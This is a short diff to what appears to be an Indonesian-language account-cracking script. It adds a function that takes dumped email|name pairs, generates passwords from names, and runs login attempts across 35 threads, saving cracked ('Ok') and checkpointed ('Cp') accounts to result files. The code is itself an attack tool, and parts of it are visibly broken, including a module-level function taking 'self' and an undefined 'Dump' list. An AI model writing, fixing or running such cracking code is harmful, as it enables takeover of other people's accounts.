@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 import requests,json,os,sys,random,datetime,time,re
+from concurrent.futures import ThreadPoolExecutor
 from rich.panel import Panel
 from rich import print
 from rich.console import Console
 from rich.console import Console as sol
 from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
 from rich.panel import Panel as nel
 from rich import print as cetak
 from rich.markdown import Markdown as mark
@@ -396,6 +396,18 @@ def passwrd():
                                 cek_opsi()
                             else:
                                 exit()
+                                
+def open_list(self):
+        try:
+            Console(width=50, style="bold hot_pink2").print(Panel("""[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
+[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
+            with ThreadPoolExecutor(max_workers=35) as (V):
+                for z in Dump:
+                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
+                    self.passwrd = self.passwrd(self.nama)
+                    V.submit(self.main, Dump, self.email, self.passwrd)
+            Console().print("\r[bold white][[bold green]Selesai[bold white]]                           ");exit()
+        except:exit()
 
     
 def crac(idf,pwv):
